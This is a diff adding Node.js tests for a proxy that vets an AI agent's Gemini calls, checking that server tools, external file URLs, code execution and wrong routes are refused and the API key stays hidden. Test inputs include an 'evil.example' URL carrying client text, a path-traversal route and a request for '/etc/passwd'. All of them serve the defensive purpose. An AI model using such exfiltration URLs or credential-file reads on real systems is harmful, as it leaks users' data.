@@ -2,12 +2,12 @@ import assert from "node:assert/strict";
 import { createServer, request } from "node:http";
 import { after, before, test } from "node:test";
 import { setTimeout as delay } from "node:timers/promises";
-import { ask, PROXY_REAL_KEY, startBridgeWithFakeModel, TEST_MODEL } from "./fake-model/bridge.mjs";
+import { ask, GEMINI_SETTINGS, GEMINI_TEST_MODEL, PROXY_REAL_KEY, startBridgeWithFakeModel, TEST_MODEL } from "./fake-model/bridge.mjs";
 import { startFakeModel } from "./fake-model/server.mjs";
 
 process.env.JUNIOR_SILVA_API_KEY ||= "test-junior-silva-key";
 delete process.env.JS_NATIVE_DEV;
-const { modelCallProblem } = await import("../server/model-proxy.mjs");
+const { googleCallProblem, modelCallProblem } = await import("../server/model-proxy.mjs");
 const { startGateway } = await import("../server/gateway.mjs");
 const { createRunToken, revokeRunToken } = await import("../server/run-tokens.mjs");
 
@@ -47,6 +47,31 @@ const changed = (change) => {
 	return body;
 };
 
+// Shaped like real Pi's Gemini calls (captured in P3.17), including the parts that are easy to get wrong:
+// thinking with a signature, a tool call and a tool reply whose data have fields called fileData, and
+// images in base64, one of them added to a tool reply.
+function geminiBody() {
+	return {
+		contents: [
+			{ role: "user", parts: [{ text: "Read this." }, { inlineData: { mimeType: "image/png", data: "iVBORw0KGgo=" } }] },
+			{ role: "model", parts: [{ thought: true, text: "Planning.", thoughtSignature: "c2ln" }, { functionCall: { name: "legal_source_retrieve_details", args: { source: "case_decision", fileData: "only data" } }, thoughtSignature: "c2ln" }] },
+			{ role: "user", parts: [{ functionResponse: { id: "call_1", name: "legal_source_retrieve_details", response: { output: "Result.", fileData: { fileUri: "only data" } }, parts: [{ inlineData: { mimeType: "image/png", data: "iVBORw0KGgo=" } }] } }] },
+		],
+		systemInstruction: { role: "user", parts: [{ text: "You are Junior Silva." }] },
+		tools: [{ functionDeclarations: [{ name: "legal_source_retrieve_details", description: "Reads legal sources.", parametersJsonSchema: { type: "object", properties: { source: { type: "string" } } } }] }],
+		toolConfig: { functionCallingConfig: { mode: "AUTO" } },
+		generationConfig: { maxOutputTokens: 65536, thinkingConfig: { includeThoughts: true, thinkingLevel: "MEDIUM" } },
+	};
+}
+
+const geminiChanged = (change) => {
+	const body = geminiBody();
+	change(body);
+	return body;
+};
+
+const GEMINI_ROUTE = `/model/google/models/${GEMINI_TEST_MODEL}:streamGenerateContent?alt=sse`;
+
 after(async () => {
 	for (const server of servers) await server.close();
 });
@@ -63,9 +88,11 @@ async function newFake() {
 	return fake;
 }
 
-// Calls the gateway's model route the way Pi's Anthropic client does, with a chosen source address.
-function modelCall(port, { token, body = piBody(), headers = {}, from = "127.0.0.1", route = "/model/anthropic/v1/messages?beta=true", signal } = {}) {
+// Calls the gateway's model route the way Pi's Anthropic client does, with a chosen source address. With
+// gemini, the way Pi's Gemini client does: the key in x-goog-api-key, and no Anthropic headers.
+function modelCall(port, { token, body = piBody(), headers = {}, from = "127.0.0.1", route = "/model/anthropic/v1/messages?beta=true", signal, gemini = false } = {}) {
 	const payload = typeof body === "string" ? body : JSON.stringify(body);
+	const own = gemini ? { ...(token ? { "x-goog-api-key": token } : {}) } : { "anthropic-version": "2023-06-01", "anthropic-beta": BETAS, ...(token ? { "x-api-key": token } : {}) };
 	return new Promise((resolve, reject) => {
 		const req = request({
 			host: "127.0.0.1",
@@ -75,7 +102,7 @@ function modelCall(port, { token, body = piBody(), headers = {}, from = "127.0.0
 			localAddress: from,
 			agent: false,
 			signal,
-			headers: { "content-type": "application/json", "anthropic-version": "2023-06-01", "anthropic-beta": BETAS, "Content-Length": Buffer.byteLength(payload), ...(token ? { "x-api-key": token } : {}), ...headers },
+			headers: { "content-type": "application/json", "Content-Length": Buffer.byteLength(payload), ...own, ...headers },
 		}, (res) => {
 			let text = "";
 			res.setEncoding("utf8");
@@ -87,6 +114,9 @@ function modelCall(port, { token, body = piBody(), headers = {}, from = "127.0.0
 		req.end(payload);
 	});
 }
+
+const geminiCall = (port, options = {}) => modelCall(port, { body: geminiBody(), route: GEMINI_ROUTE, ...options, gemini: true });
+const openGeminiGateway = (fakeUrl, modelService = {}) => openGateway(fakeUrl, { provider: "google", model: GEMINI_TEST_MODEL, ...modelService });
 
 async function waitUntil(check, withinMs, label) {
 	const deadline = Date.now() + withinMs;
@@ -242,6 +272,168 @@ test("when Pi hangs up mid-answer, the call to the model is cancelled", async ()
 	await call;
 	await waitUntil(() => fake.requests[0].closedEarly, 5_000, "the model call to be cancelled");
 	revokeRunToken(token);
+});
+
+test("a Gemini call shaped like real Pi's passes the checks", () => {
+	assert.equal(googleCallProblem(geminiBody(), GEMINI_TEST_MODEL, GEMINI_TEST_MODEL), undefined);
+	assert.equal(googleCallProblem(geminiChanged((body) => { body.generationConfig.temperature = 0.2; }), GEMINI_TEST_MODEL, GEMINI_TEST_MODEL), undefined, "with a temperature");
+	assert.equal(googleCallProblem(geminiChanged((body) => { delete body.systemInstruction; delete body.tools; delete body.toolConfig; }), GEMINI_TEST_MODEL, GEMINI_TEST_MODEL), undefined, "the smallest call");
+});
+
+test("each kind of unsafe Gemini call is caught", () => {
+	// Google's server tools reach the internet or stored data for the caller.
+	const serverTools = ["googleSearch", "googleSearchRetrieval", "urlContext", "codeExecution", "fileSearch", "googleMaps", "computerUse", "retrieval", "enterpriseWebSearch"];
+	const cases = [
+		["a body that isn't an object", [], /isn't a JSON object/],
+		["cachedContent", geminiChanged((body) => { body.cachedContent = "cachedContents/another-chat"; }), /"cachedContent"/],
+		["safetySettings", geminiChanged((body) => { body.safetySettings = []; }), /"safetySettings"/],
+		["another generation setting", geminiChanged((body) => { body.generationConfig.responseModalities = ["IMAGE"]; }), /"responseModalities"/],
+		...serverTools.map((name) => [`the ${name} tool`, geminiChanged((body) => { body.tools.push({ [name]: {} }); }), /only function declarations/]),
+		["a server tool next to Pi's own", geminiChanged((body) => { body.tools[0].googleSearch = {}; }), /only function declarations/],
+		["tools that aren't a list", geminiChanged((body) => { body.tools = { functionDeclarations: [] }; }), /only function declarations/],
+		["retrievalConfig in toolConfig", geminiChanged((body) => { body.toolConfig.retrievalConfig = { latLng: {} }; }), /only functionCallingConfig/],
+		["a fileData part", geminiChanged((body) => { body.contents[0].parts.push({ fileData: { fileUri: "https://evil.example/x.pdf?d=client-text", mimeType: "application/pdf" } }); }), /"fileData"/],
+		["a fileData part in the system instruction", geminiChanged((body) => { body.systemInstruction.parts.push({ fileData: { fileUri: "https://evil.example/x.png" } }); }), /"fileData"/],
+		["a fileData image added to a tool reply", geminiChanged((body) => { body.contents[2].parts[0].functionResponse.parts.push({ fileData: { fileUri: "https://evil.example/x.png" } }); }), /only add inline images/],
+		["an executableCode part", geminiChanged((body) => { body.contents[1].parts.push({ executableCode: { language: "PYTHON", code: "print(1)" } }); }), /"executableCode"/],
+		["a codeExecutionResult part", geminiChanged((body) => { body.contents[2].parts.push({ codeExecutionResult: { outcome: "OUTCOME_OK", output: "1" } }); }), /"codeExecutionResult"/],
+		["a content with another field", geminiChanged((body) => { body.contents[0].cachedContent = "x"; }), /only a role and parts/],
+		["parts that aren't a list", geminiChanged((body) => { body.contents[0].parts = { text: "x" }; }), /parts must be a list/],
+		["contents that aren't a list", geminiChanged((body) => { body.contents = { role: "user" }; }), /contents must be a list/],
+	];
+	for (const [label, body, expected] of cases) assert.match(String(googleCallProblem(body, GEMINI_TEST_MODEL, GEMINI_TEST_MODEL)), expected, label);
+	assert.match(String(googleCallProblem(geminiBody(), "gemini-3.8-pro", GEMINI_TEST_MODEL)), /model isn't allowed/, "another model in the path");
+	assert.match(String(googleCallProblem(geminiBody(), GEMINI_TEST_MODEL, undefined)), /model isn't allowed/, "no model configured");
+});
+
+test("an allowed Gemini call reaches the model with the real key in Google's header, and streams back unchanged", async () => {
+	const fake = await newFake();
+	const port = await openGeminiGateway(fake.url);
+	const token = createRunToken(CHAT, 60_000, "127.0.0.1");
+	fake.script([{ text: "FAKE-GEMINI-ANSWER" }]);
+	const reply = await geminiCall(port, { token, headers: { "user-agent": "google-genai-sdk", "x-goog-api-client": "google-genai-sdk/2.21.0", "x-extra": "not passed on" } });
+	assert.equal(reply.status, 200);
+	assert.match(reply.headers["content-type"], /text\/event-stream/);
+	assert.match(reply.text, /"text":"FAKE-GEMINI-ANSWER"/);
+	const [arrived] = fake.requests;
+	assert.equal(arrived.path, `/models/${GEMINI_TEST_MODEL}:streamGenerateContent?alt=sse`);
+	assert.equal(arrived.headers["x-goog-api-key"], PROXY_REAL_KEY);
+	assert.equal(arrived.headers["x-api-key"], undefined);
+	assert.equal(arrived.headers["x-goog-api-client"], undefined);
+	assert.equal(arrived.headers["x-extra"], undefined);
+	assert.ok(!JSON.stringify(arrived.headers).includes(token), "the run token never reaches the model");
+	assert.deepEqual(arrived.body, geminiBody());
+	revokeRunToken(token);
+});
+
+test("refused Gemini calls get 400 in Google's error shape, and never reach the model", async (t) => {
+	t.mock.method(console, "warn", () => {});
+	const fake = await newFake();
+	const port = await openGeminiGateway(fake.url);
+	const token = createRunToken(CHAT, 60_000, "127.0.0.1");
+	fake.script([]);
+	for (const body of [
+		geminiChanged((body) => { body.cachedContent = "cachedContents/another-chat"; }),
+		geminiChanged((body) => { body.tools.push({ googleSearch: {} }); }),
+		geminiChanged((body) => { body.tools.push({ urlContext: {} }); }),
+		geminiChanged((body) => { body.contents[0].parts.push({ fileData: { fileUri: "https://evil.example/x.png" } }); }),
+	]) {
+		const reply = await geminiCall(port, { token, body });
+		assert.equal(reply.status, 400);
+		assert.deepEqual(JSON.parse(reply.text), { error: { code: 400, message: "This model call isn't allowed", status: "INVALID_ARGUMENT" } });
+	}
+	assert.equal((await geminiCall(port, { token, route: "/model/google/models/gemini-3.8-pro:streamGenerateContent?alt=sse" })).status, 400, "another model in the path");
+	assert.equal((await geminiCall(port, { token, body: "{not json" })).status, 400);
+	assert.equal(fake.requests.length, 0);
+	revokeRunToken(token);
+});
+
+test("Gemini calls without a valid run token get 401 in Google's shape, and never reach the model", async () => {
+	const fake = await newFake();
+	const port = await openGeminiGateway(fake.url);
+	const token = createRunToken(CHAT, 60_000, "127.0.0.1");
+	for (const [label, options] of [["no token", {}], ["a wrong token", { token: "a".repeat(64) }], ["the real key", { token: PROXY_REAL_KEY }], ["the token in Anthropic's header", { headers: { "x-api-key": token } }], ["the right token from another address", { token, from: "127.0.0.2" }]]) {
+		const reply = await geminiCall(port, options);
+		assert.equal(reply.status, 401, label);
+		assert.equal(JSON.parse(reply.text).error.status, "UNAUTHENTICATED", label);
+	}
+	assert.equal(fake.requests.length, 0);
+	revokeRunToken(token);
+});
+
+test("only the provider in use has an open route, and only Gemini's streaming method", async () => {
+	const fake = await newFake();
+	const gemini = await openGeminiGateway(fake.url);
+	const claude = await openGateway(fake.url);
+	const token = createRunToken(CHAT, 60_000, "127.0.0.1");
+	fake.script([]);
+	assert.equal((await modelCall(gemini, { token })).status, 404, "Anthropic's route is closed when the provider is Google");
+	assert.equal((await geminiCall(claude, { token })).status, 404, "Gemini's route is closed when the provider is Anthropic");
+	for (const route of [
+		`/model/google/models/${GEMINI_TEST_MODEL}:generateContent`,
+		`/model/google/models/${GEMINI_TEST_MODEL}:countTokens`,
+		`/model/google/models/${GEMINI_TEST_MODEL}:streamGenerateContent`,
+		`/model/google/models/${GEMINI_TEST_MODEL}:streamGenerateContent?alt=json`,
+		`/model/google/models/${GEMINI_TEST_MODEL}:streamGenerateContent?alt=sse&key=x`,
+		"/model/google/files",
+		"/model/google/cachedContents",
+		`/model/google/v1beta/models/${GEMINI_TEST_MODEL}:streamGenerateContent?alt=sse`,
+		`/model/google/models/../models/${GEMINI_TEST_MODEL}:streamGenerateContent?alt=sse`,
+	]) assert.equal((await geminiCall(gemini, { token, route })).status, 404, route);
+	assert.equal(fake.requests.length, 0);
+	revokeRunToken(token);
+});
+
+test("Gemini: the size limit, and the key removed from errors, a missing key and an unreachable model", async (t) => {
+	t.mock.method(console, "error", () => {});
+	const fake = await newFake();
+	const port = await openGeminiGateway(fake.url);
+	const token = createRunToken(CHAT, 60_000, "127.0.0.1");
+	const tooLarge = geminiChanged((body) => { body.contents[0].parts[0].text = "x".repeat(LIMIT); });
+	assert.equal((await geminiCall(port, { token, body: tooLarge })).status, 413);
+
+	fake.script([{ status: 400, error: { code: 400, message: `API key not valid: ${PROXY_REAL_KEY}`, status: "INVALID_ARGUMENT" } }]);
+	const echoed = await geminiCall(port, { token });
+	assert.equal(echoed.status, 400);
+	assert.doesNotMatch(echoed.text, new RegExp(PROXY_REAL_KEY));
+	assert.match(echoed.text, /\[removed\]/);
+
+	const noKey = await openGeminiGateway(fake.url, { apiKey: "" });
+	fake.script([]);
+	assert.equal((await geminiCall(noKey, { token })).status, 503);
+	assert.equal(fake.requests.length, 0, "with no key set, nothing reaches the model");
+
+	const closed = createServer();
+	await new Promise((resolve) => closed.listen(0, "127.0.0.1", resolve));
+	const deadPort = closed.address().port;
+	await new Promise((resolve) => closed.close(resolve));
+	const unreachable = await openGeminiGateway(`http://127.0.0.1:${deadPort}`);
+	const reply = await geminiCall(unreachable, { token });
+	assert.equal(reply.status, 502);
+	assert.deepEqual(JSON.parse(reply.text), { error: { code: 502, message: "The model service could not be reached", status: "UNAVAILABLE" } });
+	revokeRunToken(token);
+});
+
+test("real Pi works with Gemini through the proxy, and everything it sends is allowed", async () => {
+	const fake = await newFake();
+	const bridge = await startBridgeWithFakeModel(fake.url, { environment: GEMINI_SETTINGS });
+	servers.push(bridge);
+	fake.script([{ text: "FAKE-GEMINI: through the proxy." }]);
+	const plain = await ask(bridge, "gemini-chat-1", "What is a plaint?");
+	assert.equal(plain.status, 200);
+	assert.equal(plain.answer, "FAKE-GEMINI: through the proxy.");
+
+	fake.script([{ tool: "legal_validate_draft", input: { file_path: "/etc/passwd" } }, { text: "FAKE-GEMINI: tool done through the proxy." }]);
+	const withTool = await ask(bridge, "gemini-chat-2", "Check the draft at /etc/passwd.");
+	assert.equal(withTool.answer, "FAKE-GEMINI: tool done through the proxy.");
+	assert.equal(fake.requests.length, 2);
+	assert.match(JSON.stringify(fake.requests[1].body.contents), /File not found in this chat\./);
+	for (const arrived of fake.requests) {
+		assert.equal(arrived.path, `/models/${GEMINI_TEST_MODEL}:streamGenerateContent?alt=sse`);
+		assert.equal(arrived.headers["x-goog-api-key"], PROXY_REAL_KEY);
+		assert.equal(googleCallProblem(arrived.body, GEMINI_TEST_MODEL, GEMINI_TEST_MODEL), undefined, "real Pi's call is on the allowed lists");
+	}
+	assert.doesNotMatch(bridge.log, /Refused a model call/);
 });
 
 test("real Pi works through the proxy, and everything it sends is allowed", async () => {
